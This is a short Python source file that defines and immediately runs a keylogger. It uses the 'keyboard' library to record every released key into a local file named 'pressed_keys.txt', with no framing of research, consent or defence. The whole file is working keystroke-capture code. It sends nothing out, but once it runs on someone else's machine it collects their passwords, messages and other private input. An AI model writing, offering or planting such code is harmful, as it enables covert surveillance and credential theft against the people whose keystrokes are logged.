import keyboard

class keylogger():
    def __init__(self, log_filename):
        self.f = open(log_filename, 'w')

    def start_log(self):
        keyboard.on_release(callback=self.new_key)
        keyboard.wait()

    def new_key(self, event):
        button = event.name
        if button == 'space':
            button = " "
        if button == 'enter':
            button = "\n"
        self.f.write(button)
        self.f.flush()

keylogger_object = keylogger("pressed_keys.txt")
keylogger_object.start_log()
